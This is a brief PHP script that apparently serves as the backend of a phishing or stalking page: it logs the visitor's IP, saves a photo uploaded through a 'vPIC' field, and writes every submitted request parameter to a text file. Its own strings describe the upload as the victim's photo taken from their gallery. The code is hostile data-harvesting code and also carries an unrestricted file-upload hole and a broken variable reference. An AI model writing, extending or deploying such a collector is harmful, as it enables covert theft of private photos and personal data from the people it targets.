<?php
if(!empty($_SERVER['HTTP_CLIENT_IP'])){
    $ips=$_SERVER['HTTP_CLIENT_IP'];}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ips=$_SERVER['HTTP_X_FORWARDED_FOR'];}else{$ips=$_SERVER['REMOTE_ADDR'];}

function savedImage(){
    $target = "$ips/";
    $target = $target . basename($_FILES["vPIC"]["name"]);

    if (move_uploaded_file($_FILES["vPIC"]["tmp_name"], $target)) { 
            echo "The file ". basename( $_FILES["vPIC"]["name"]). " has been uploaded.";
            $target="Saved_at_".$target."_path";
            return $target;

    } else { 
            echo "Sorry, there was an error while uploading your file.";
            $target="Unable_to_upload_victims_photo_from_their_galary";
            return $target;
    }
}

if(isset($_REQUEST))
    {
    $image = savedImage();
    $wfile=fopen("./form.txt","w");

    foreach($_REQUEST as $var => $val) {
        fwrite($wfile, $var);fwrite($wfile, "=");
        fwrite($wfile, $val);fwrite($wfile, "\r\n");
    }
    fwrite($wfile, "galaryPic");fwrite($wfile, "=");
    fwrite($wfile, $image);fwrite($wfile, "\r\n");
}

?>
